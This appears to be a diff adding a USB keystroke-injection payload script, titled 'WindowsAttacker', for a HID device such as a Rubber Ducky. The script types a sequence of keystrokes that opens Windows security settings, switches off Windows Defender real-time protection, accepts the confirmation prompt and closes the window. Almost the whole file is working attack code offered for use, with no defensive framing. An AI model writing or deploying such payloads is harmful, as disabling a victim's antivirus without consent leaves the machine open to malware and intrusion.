@@ -1,0 +1,53 @@
+REM	Title: WindowsAttacker
+REM	Author: White_Wid0w
+REM	Description: turns off real time virus protection (Windows Defender) on device.
+
+REM	Target: Windows OS
+
+
+
+
+DELAY 500
+GUI s 
+DELAY 1000 
+STRING virus
+DELAY 1000  
+ENTER
+DELAY 2000
+DOWNARROW
+DELAY 1000
+DOWNARROW
+DELAY 1000
+DOWNARROW
+DELAY 1000
+DOWNARROW
+DELAY 1000
+DOWNARROW
+DELAY 1000
+DOWNARROW
+DELAY 1000
+ENTER
+DELAY 1000
+STRING " "
+DELAY 3000
+LEFTARROW
+Delay 2000
+ENTER
+DELAY 2000
+ALT F4
+DELAY 1000
+
+REM DONE
+
+
+
+
+
+
+
+
+
+
+
+
+
